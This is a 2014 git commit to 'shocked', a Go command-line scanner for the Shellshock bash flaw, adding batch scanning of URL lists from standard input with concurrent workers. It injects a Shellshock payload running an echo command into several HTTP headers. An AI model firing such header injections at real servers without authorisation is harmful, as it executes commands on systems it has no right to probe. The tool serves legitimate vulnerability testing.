0364dc22306d1b4795630108a397e187ec69a03d
Benjamin Ruston <benjy.ruston@gmail.com>
2014-10-01 16:39:40 +0100

    add support for piping in a list of urls to check

--- shocked/README.md
+++ shocked/README.md
@@ -1,12 +1,16 @@
 Simple shellshock vulnerability test.
 
 <pre>
-Usage of ./shocked:
+Usage of ./shocked (and its defaults):
+  -stdin=false: If true, a list of URLs to check is read from Stdin.
+  -timeout=10: How long to wait for a response before giving up.
   -url="": The URL to check.
   -verbose=false: If true, the response body will be printed.
+  -workers=5: The number of concurrent requests to make.
 </pre>
 
 Example:
 ```bash
 ./shocked -url="http://dev.lan/cgi-bin/poc.cgi" -verbose
+cat urls.txt | ./shocked -stdin -workers=3
 ```
--- shocked/main.go
+++ shocked/main.go
@@ -1,13 +1,16 @@
 package main
 
 import (
-	"errors"
+	"bufio"
 	"flag"
 	"fmt"
 	"io/ioutil"
 	"log"
 	"net/http"
+	"os"
 	"reflect"
+	"sync"
+	"time"
 )
 
 const (
@@ -15,27 +18,47 @@ const (
 	PAYLOAD_ECHO   = `echo "Content-Type": "text/html"; echo; echo 'oh noes, vuln'`
 )
 
+var client http.Client
+
+type result struct {
+	url        string
+	vulnerable bool
+}
+
 func main() {
 	url := flag.String("url", "", "The URL to check.")
 	verbose := flag.Bool("verbose", false, "If true, the response body will be printed.")
+	stdin := flag.Bool("stdin", false, "If true, a list of URLs to check is read from Stdin.")
+	timeout := flag.Int("timeout", 10, "How long to wait for a response before giving up.")
+	workers := flag.Int("workers", 5, "The number of concurrent requests to make.")
 	flag.Parse()
-	if *url == "" {
+	client = http.Client{Timeout: time.Second * time.Duration(*timeout)}
+	if *url != "" {
+		bashOne(*url, *verbose)
+		return
+	}
+	if !*stdin {
 		flag.Usage()
 		return
 	}
-	vuln, err := bashit(*url, *verbose)
-	if err != nil {
-		log.Fatal(err)
+	work := make(chan string)
+	var wg sync.WaitGroup
+	go func() {
+		scanner := bufio.NewScanner(os.Stdin)
+		for scanner.Scan() {
+			work <- scanner.Text()
+		}
+		close(work)
+	}()
+	for i := 0; i < *workers; i++ {
+		wg.Add(1)
+		go bashMany(*verbose, work, &wg)
 	}
-	if vuln {
-		fmt.Printf("%s appears vulnerable to shellshock.\n", *url)
-	} else {
-		fmt.Printf("%s does not appear vulnerable to shellshock.\n", *url)
-	}
+	wg.Wait()
 }
 
 func setHeaders(r *http.Request) *http.Request {
-	headers := []string{"User-Agent", "Host", "Cookie", "Host", "Referer"}
+	headers := []string{"User-Agent", "Host", "Cookie", "Referer"}
 	for _, v := range headers {
 		r.Header.Set(v, PAYLOAD_PREFIX+PAYLOAD_ECHO)
 	}
@@ -45,8 +68,7 @@ func setHeaders(r *http.Request) *http.Request {
 func bashit(url string, verbose bool) (bool, error) {
 	req, err := http.NewRequest("GET", url, nil)
 	setHeaders(req)
-	c := &http.Client{}
-	resp, err := c.Do(req)
+	resp, err := client.Do(req)
 	if err != nil {
 		return false, err
 	}
@@ -56,7 +78,7 @@ func bashit(url string, verbose bool) (bool, error) {
 		return false, err
 	}
 	if resp.StatusCode == http.StatusNotFound {
-		return false, errors.New("URL returned status code 404 (not found)")
+		return false, fmt.Errorf("%s returned status code 404 (not found)", url)
 	}
 	if verbose {
 		fmt.Printf("%s\n", body)
@@ -65,4 +87,30 @@ func bashit(url string, verbose bool) (bool, error) {
 		return true, nil
 	}
 	return false, nil
+}
+
+func bashOne(url string, verbose bool) {
+	vuln, err := bashit(url, verbose)
+	if err != nil {
+		log.Fatal(err)
+	}
+	if vuln {
+		fmt.Printf("%s appears vulnerable to shellshock.\n", url)
+	} else {
+		fmt.Printf("%s does not appear vulnerable to shellshock.\n", url)
+	}
+}
+
+func bashMany(verbose bool, work chan string, wg *sync.WaitGroup) {
+	for url := range work {
+		vuln, err := bashit(url, verbose)
+		if err != nil {
+			log.Println(err)
+			continue
+		}
+		if vuln {
+			fmt.Println(url)
+		}
+	}
+	wg.Done()
 }
